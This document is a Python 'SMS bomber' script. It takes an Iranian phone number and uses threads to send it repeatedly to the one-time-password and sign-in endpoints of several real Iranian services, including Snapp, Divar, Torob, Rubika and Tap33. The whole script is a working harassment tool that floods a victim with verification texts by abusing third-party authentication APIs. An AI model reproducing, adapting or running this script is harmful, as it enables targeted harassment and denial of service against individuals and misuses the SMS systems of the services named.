from requests import get,post
from time import sleep
from threading import Thread


class smsbomber:
    ths = 0
    ths2 = 0

    def app_torob(self, number=''):
        self.ths += 1
        number = '0' + number
        get('https://api.torob.com/a/phone/send-pin/?phone_number=' + number)
        self.ths2 += 1
        self.ths -= 1

    def app_shad(self, number=''):
        self.ths += 1
        number = '98' + number
        post('https://shadmessenger18.iranlms.ir/',
                      data='{"api_version":"3","method":"sendCode","data":{"phone_number":"' + number + '","send_type":"SMS"}}')
        self.ths2 += 1
        self.ths -= 1

    def app_divar(self, number=''):
        self.ths += 1
        post('https://api.divar.ir/v5/auth/authenticate', data='{"phone":"' + number + '"}')
        self.ths2 += 1
        self.ths -= 1

    def app_gap(self, number=''):
        self.ths += 1
        number = '0' + number
        get('https://core.gap.im/v1/user/add.json?mobile=' + number)
        self.ths2 += 1
        self.ths -= 1

    def app_rubika(self, number=''):
        self.ths += 1
        number = '98' + number
        post('https://messengerg2c20.iranlms.ir/',
                      data='{"api_version":"3","method":"sendCode","data":{"phone_number":"' + number + '","send_type":"SMS"}}')
        self.ths2 += 1
        self.ths -= 1

    def app_snap(self, number=''):
        self.ths += 1
        number = '+98' + number
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'app-version': 'pwa',
            'x-app-version': '5.0.1',
            'x-app-name': 'passenger-pwa',
            'content-type': 'application/json',
            'Origin': 'https://app.snapp.taxi',
            'Connection': 'keep-alive',
            'Referer': 'https://app.snapp.taxi/login/?redirect_to=%2F',
            'TE': 'Trailers',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
        }
        post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', data='{"cellphone":"' + number + '"}',
                      headers=header)
        self.ths2 += 1
        self.ths -= 1

    def app_emtiyaz(self, number=''):
        number = '0' + number
        self.ths += 1
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://web.emtiyaz.app',
            'Connection': 'close',
            'Referer': 'https://web.emtiyaz.app/settings',
        }
        post('https://web.emtiyaz.app/json/login', data='send=1&cellphone=' + number, headers=header)
        self.ths2 += 1
        self.ths -= 1

    def app_bama(self, number=''):
        number = '0' + number
        self.ths += 1
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'https://bama.ir/Signin?ReturnUrl=%2Fprofile',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://bama.ir',
            'Connection': 'close',
        }
        post('https://bama.ir/signin-checkforcellnumber', data='cellNumber=' + number, headers=header)
        self.ths2 += 1
        self.ths -= 1

    def app_tap33(self, number=''):
        number = '0' + number
        self.ths += 1
        header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'https://app.tapsi.cab/',
            'content-type': 'application/json',
            'Origin': 'https://app.tapsi.cab',
        }
        post('https://tap33.me/api/v2/user',
                      data='{"credential":{"phoneNumber":"' + number + '","role":"PASSENGER"}}', headers=header)
        self.ths2 += 1
        self.ths -= 1

    def __init__(self, num=''):
        for i in range(5):
            x = Thread(target=self.app_torob, args=(num,))
            x.start()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')
        for i in range(10):
            while (self.ths >= 5):
                sleep(1)
            x = Thread(target=self.app_divar, args=(num,))
            x.start()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')
        for i in range(10):
            while (self.ths >= 5):
                sleep(1)
            x = Thread(target=self.app_snap, args=(num,))
            x.start()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')
        for i in range(2):
            while (self.ths >= 5):
                sleep(1)
            x = Thread(target=self.app_shad, args=(num,))
            x.start()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')
        for i in range(10):
            while (self.ths >= 5):
                sleep(1)
            x = Thread(target=self.app_gap, args=(num,))
            x.start()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')
        for i in range(2):
            while (self.ths >= 5):
                sleep(1)
            x = Thread(target=self.app_emtiyaz, args=(num,))
            x.start()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')
        for i in range(2):
            while (self.ths >= 5):
                sleep(1)
            x = Thread(target=self.app_bama, args=(num,))
            x.start()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')
        for i in range(5):
            while (self.ths >= 5):
                sleep(1)
            x = Thread(target=self.app_tap33, args=(num,))
            x.start()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')
        for i in range(2):
            while (self.ths >= 5):
                sleep(1)
            x = Thread(target=self.app_rubika, args=(num,))
            x.start()
            x.join()
            print('\033[1mCount Request Sent : \033[32;1m' + str(self.ths2), end='\033[0m\r')


print('''\033[1;5m
        ___           ___    ___                      _                  
       (  _`\ /'\_/`\(  _`\ (  _`\                   ( )                 
       | (_(_)|     || (_(_)| (_) )   _     ___ ___  | |_      __   _ __ 
       `\__ \ | (_) |`\__ \ |  _ <' /'_`\ /' _ ` _ `\| '_`\  /'__`\( '__)
       ( )_) || | | |( )_) || (_) )( (_) )| ( ) ( ) || |_) )(  ___/| |   
       `\____)(_) (_)`\____)(____/'`\___/'(_) (_) (_)(_,__/'`\____)(_)   
                                                                                                                 
\033[0m''')
num = input('\033[3;1mEnter number (912xxxxxxx) : \033[0m')
while not num.isdigit():
    print('Please enter number')
    num = input('Enter number (912xxxxxxx) : ')
smsbomber(str(num))
print('\nCompeleted')
